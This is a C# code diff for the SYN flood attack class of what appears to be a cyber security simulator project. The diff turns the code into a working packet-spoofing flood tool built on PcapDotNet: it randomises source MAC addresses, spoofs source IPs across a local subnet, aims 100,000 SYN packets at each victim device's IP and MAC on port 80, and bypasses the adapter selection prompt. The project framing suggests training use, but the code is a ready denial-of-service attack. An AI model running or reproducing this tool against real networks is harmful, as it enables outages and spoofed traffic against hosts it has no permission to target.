@@ -1,22 +1,9 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Linq;
-using System.Net;
-using System.Net.Sockets;
-using System.Text;
-using System.Threading.Tasks;
-using PcapDotNet.Base;
 using PcapDotNet.Core;
 using PcapDotNet.Packets;
-using PcapDotNet.Packets.Arp;
-using PcapDotNet.Packets.Dns;
 using PcapDotNet.Packets.Ethernet;
-using PcapDotNet.Packets.Gre;
-using PcapDotNet.Packets.Http;
-using PcapDotNet.Packets.Icmp;
-using PcapDotNet.Packets.Igmp;
 using PcapDotNet.Packets.IpV4;
-using PcapDotNet.Packets.IpV6;
 using PcapDotNet.Packets.Transport;
 using PDA_Cyber_Security_Simulator_Domain;
 
@@ -43,7 +30,7 @@ namespace PDA_Cyber_Security_Simulator_V1
             Victim = vict;
         }
 
-        static void MainSynFlood(string victimAddress)
+        static void MainSynFlood(string victimIpAddress, string victimMacAddress)
         {
             Random rand = new Random((int)DateTime.Now.Ticks);
             IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine;
@@ -55,7 +42,7 @@ namespace PDA_Cyber_Security_Simulator_V1
             }
 
             // Print the list
-            for (int i = 0; i != allDevices.Count; ++i)
+            /*for (int i = 0; i != allDevices.Count; ++i)
             {
                 LivePacketDevice device = allDevices[i];
                 Console.Write((i + 1) + ". " + device.Name);
@@ -75,10 +62,10 @@ namespace PDA_Cyber_Security_Simulator_V1
                 {
                     deviceIndex = 0;
                 }
-            } while (deviceIndex == 0);
+            } while (deviceIndex == 0);*/
 
             // Take the selected adapter
-            PacketDevice selectedDevice = allDevices[deviceIndex - 1];
+            PacketDevice selectedDevice = allDevices[0];
 
             // Open the output device
             using (PacketCommunicator communicator = selectedDevice.Open(100, // name of the device
@@ -86,10 +73,11 @@ namespace PDA_Cyber_Security_Simulator_V1
                                                                          1000)) // read timeout
             {
                 // Supposing to be on ethernet, set mac source to 01:01:01:01:01:01
-                MacAddress source = new MacAddress("01:01:01:01:01:01");
+                string randMac = "4C:0C:BD:" + rand.Next(2, 9).ToString() + rand.Next(2, 9).ToString() + ":" + rand.Next(2, 9).ToString() + rand.Next(2, 9).ToString() + ":" + rand.Next(2, 9).ToString() + rand.Next(2, 9).ToString();
+                MacAddress source = new MacAddress(randMac);
 
                 // set mac destination to 02:02:02:02:02:02
-                MacAddress destination = new MacAddress("02:02:02:02:02:02");
+                MacAddress destination = new MacAddress(victimMacAddress);
 
                 // Create the packets layers
 
@@ -103,7 +91,8 @@ namespace PDA_Cyber_Security_Simulator_V1
                 // IPv4 Layer
                 IpV4Layer ipV4Layer = new IpV4Layer
                 {
-                    Source = new IpV4Address("1.2.3.4"),
+                    Source = new IpV4Address("192.168.1.101"),
+                    CurrentDestination = new IpV4Address(victimIpAddress),
                     Ttl = 128,
                     // The rest of the important parameters will be set for each packet
                 };
@@ -118,16 +107,18 @@ namespace PDA_Cyber_Security_Simulator_V1
                 PacketBuilder builder = new PacketBuilder(ethernetLayer, ipV4Layer, tcpLayer);
 
                 // Send 100 Pings to different destination with different parameters
-                for (int i = 0; i != 10000; ++i)
+                for (int i = 0; i != 100000; ++i)
                 {
+                    randMac = "4C:0C:BD:" + rand.Next(2, 9).ToString() + rand.Next(2, 9).ToString() + ":" + rand.Next(2, 9).ToString() + rand.Next(2, 9).ToString() + ":" + rand.Next(2, 9).ToString() + rand.Next(2, 9).ToString();
+                    ethernetLayer.Source = new MacAddress(randMac);
+
                     // Set IPv4 parameters
-                    // ipV4Layer.CurrentDestination = victimAddress;
-                    ipV4Layer.CurrentDestination = new IpV4Address(victimAddress);
+                    ipV4Layer.Source = new IpV4Address("192.168.1." + rand.Next(102, 199).ToString());
                     ipV4Layer.Identification = (ushort)i;
 
                     // Set TCP parameters
                     tcpLayer.SourcePort = (ushort)(rand.Next(0, 1000) + 33000);
-                    tcpLayer.DestinationPort = (ushort)8080;
+                    tcpLayer.DestinationPort = (ushort)80;
 
                     // Build the packet
                     Packet packet = builder.Build(DateTime.Now);
@@ -143,7 +134,7 @@ namespace PDA_Cyber_Security_Simulator_V1
         {
             for (int i = 0; i < Victim.Devices.Count; i++)
             {
-                SynFloodAttack.MainSynFlood(Victim.Devices[i].IpAddress);
+                SynFloodAttack.MainSynFlood(Victim.Devices[i].IpAddress, Victim.Devices[i].MacAddress);
             }
         }
     }
